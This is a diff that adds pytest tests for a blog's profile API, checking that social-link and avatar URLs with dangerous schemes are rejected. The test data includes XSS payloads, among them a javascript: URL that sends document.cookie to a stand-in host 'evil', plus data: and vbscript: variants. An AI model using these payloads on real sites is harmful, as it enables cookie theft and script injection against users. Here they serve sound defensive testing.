@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import pytest
 from httpx import AsyncClient
 
 from tests.factories import make_article_payload
@@ -102,6 +103,143 @@ class TestProfile:
         assert body["headline"] is None
         assert body["email"] is None
         assert body["icp"] is None
+
+
+class TestProfileUrlSafety:
+    """社交链接与头像也是「前端直接绑到 :href / :src」的用户可控值。
+
+    这两个字段此前是唯一绕开 ``app.utils.url.normalize_http_url`` 的入口，
+    所以用例的口径与 ``test_friend_links.py`` 的 URL 安全用例保持一致：
+    伪协议一律 422（拒绝而不是静默丢弃），并通过 GET 回读确认没有落库。
+    """
+
+    @pytest.mark.parametrize(
+        "bad_url",
+        [
+            "javascript:alert(1)",
+            "JavaScript:fetch('//evil/'+document.cookie)",
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+            "vbscript:msgbox(1)",
+            "java\nscript:alert(1)",  # 浏览器会把换行剥掉，等价于 javascript:
+        ],
+    )
+    async def test_dangerous_scheme_in_social_link_rejected(
+        self, client: AsyncClient, admin_headers: dict[str, str], bad_url: str
+    ) -> None:
+        response = await client.patch(
+            "/api/v1/site/profile",
+            json={"social_links": [{"label": "恶意", "url": bad_url}]},
+            headers=admin_headers,
+        )
+
+        assert response.status_code == 422
+        # 拒绝而不是静默丢弃：回读一次，确认库里没有被写进任何社交链接
+        profile = (await client.get("/api/v1/site/profile")).json()
+        stored = profile.get("social_links") or []
+        assert all("javascript" not in (item["url"] or "").lower() for item in stored)
+
+    async def test_dangerous_scheme_in_avatar_rejected(
+        self, client: AsyncClient, admin_headers: dict[str, str]
+    ) -> None:
+        """头像同样是用户可控 URL（关于页 `<img :src>`），不能放行伪协议。"""
+        response = await client.patch(
+            "/api/v1/site/profile",
+            json={"avatar_url": "javascript:alert(1)"},
+            headers=admin_headers,
+        )
+
+        assert response.status_code == 422
+        assert (await client.get("/api/v1/site/profile")).json()[
+            "avatar_url"
+        ] != "javascript:alert(1)"
+
+    async def test_scheme_less_social_link_gets_https(
+        self, client: AsyncClient, admin_headers: dict[str, str]
+    ) -> None:
+        """没写协议的输入按同一口径补 https://，与评论 / 友链行为一致。"""
+        response = await client.patch(
+            "/api/v1/site/profile",
+            json={"social_links": [{"label": "GitHub", "url": "github.com/example"}]},
+            headers=admin_headers,
+        )
+
+        assert response.status_code == 200
+        assert response.json()["social_links"][0]["url"] == "https://github.com/example"
+
+    async def test_site_relative_social_link_is_accepted(
+        self, client: AsyncClient, admin_headers: dict[str, str]
+    ) -> None:
+        """站内相对路径必须被接受：种子数据里的 RSS 就是 ``/api/v1/articles``。
+
+        第一版校验直接复用 ``normalize_http_url``，把相对路径判成「不是绝对地址」，
+        于是**读接口 500** —— 种子数据自己就通不过自己的校验器。这条用例守住
+        「相对路径是合法输入」，也就是「校验只判协议，不要求必须是绝对地址」。
+        """
+        response = await client.patch(
+            "/api/v1/site/profile",
+            json={"social_links": [{"label": "RSS", "url": "/api/v1/articles", "icon": "rss"}]},
+            headers=admin_headers,
+        )
+
+        assert response.status_code == 200
+        assert response.json()["social_links"][0]["url"] == "/api/v1/articles"
+        # 回读一次：读模型（SiteProfileRead）也必须能序列化相对路径
+        readback = (await client.get("/api/v1/site/profile")).json()
+        assert readback["social_links"][0]["url"] == "/api/v1/articles"
+
+    async def test_protocol_relative_social_link_rejected(
+        self, client: AsyncClient, admin_headers: dict[str, str]
+    ) -> None:
+        """``//evil.test/x`` 看着像站内路径，实际解析成跨域绝对地址，必须拒绝。"""
+        response = await client.patch(
+            "/api/v1/site/profile",
+            json={"social_links": [{"label": "伪装", "url": "//evil.test/x"}]},
+            headers=admin_headers,
+        )
+
+        assert response.status_code == 422
+
+    async def test_legacy_dirty_url_still_readable(
+        self, client: AsyncClient, admin_headers: dict[str, str]
+    ) -> None:
+        """库里直接写进一条伪协议旧数据，读接口不能 500。
+
+        这是本次改动的核心回归点：把校验器加在 ``SocialLink`` 上会让**响应模型**
+        在 ``model_validate`` 旧数据时抛错，表现为 ``GET /api/v1/site/profile``
+        整站 500。所以校验只放在写入模型（``SocialLinkInput``）上，读模型保持宽松
+        —— 与 ``FriendLinkRead`` 不带校验器是同一个理由。
+        """
+        # 绕开写入校验，模拟「校验上线之前就已经存在的行」：直接写库
+        from app.db.session import async_session_factory
+        from app.repositories import SiteRepository
+
+        async with async_session_factory() as session:
+            profile = await SiteRepository(session).get_or_create_profile()
+            profile.social_links = [{"label": "旧数据", "url": "javascript:alert(1)"}]
+            await session.commit()
+
+        response = await client.get("/api/v1/site/profile")
+
+        assert response.status_code == 200
+        # 读得出来（前端有 safeExternalUrl 兜底，不会把它渲染成链接）
+        assert response.json()["social_links"][0]["url"] == "javascript:alert(1)"
+
+    async def test_avatar_can_be_cleared_with_null(
+        self, client: AsyncClient, admin_headers: dict[str, str]
+    ) -> None:
+        """加了校验之后，「清空头像」这条路径必须仍然可用。"""
+        await client.patch(
+            "/api/v1/site/profile",
+            json={"avatar_url": "https://example.com/a.png"},
+            headers=admin_headers,
+        )
+
+        response = await client.patch(
+            "/api/v1/site/profile", json={"avatar_url": None}, headers=admin_headers
+        )
+
+        assert response.status_code == 200
+        assert response.json()["avatar_url"] is None
 
     async def test_boolean_null_is_treated_as_noop(
         self, client: AsyncClient, admin_headers: dict[str, str]
